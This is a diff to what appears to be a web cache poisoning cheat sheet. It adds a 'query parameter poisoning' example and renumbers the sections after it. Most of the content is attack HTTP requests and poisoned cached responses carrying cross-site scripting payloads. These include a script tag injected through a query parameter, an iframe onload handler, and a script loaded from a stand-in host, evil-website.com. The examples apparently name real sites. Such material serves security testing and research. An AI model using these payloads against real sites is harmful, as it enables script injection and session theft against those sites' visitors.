@@ -79,7 +79,19 @@ Vary: User-Agent, Accept-Encoding
 <link rel="canonical" href="https://a">a<iframe onload=alert(1)>
 ```
 
-5. Seizing the Cache
+5. query parameter poisoning
+```
+GET /?evil='/><script>alert(1)</script> HTTP/1.1
+Host: www.vuln.com
+
+### Response:
+HTTP/1.1 200 OK
+X-Cache: miss, hit
+…
+<href="https://www.vuln.com/?evil='/><script>alert(1)</script>">
+```
+
+6. Seizing the Cache
 ```
 GET / HTTP/1.1
 Host: unity3d.com
@@ -94,7 +106,7 @@ Cache-Control: public, max-age=1800
 <script src="https://evil-website.com/x.js"></script>
 ```
 
-6. Route Poisoning
+7. Route Poisoning
 ```
 GET / HTTP/1.1
 Host: www.goodhire.com
@@ -119,7 +131,7 @@ HTTP/1.1 200 OK
 <script>alert(document.domain)</script>
 ```
 
-7. Hidden Route Poisoning
+8. Hidden Route Poisoning
 ```
 GET / HTTP/1.1
 Host: blog.cloudflare.com
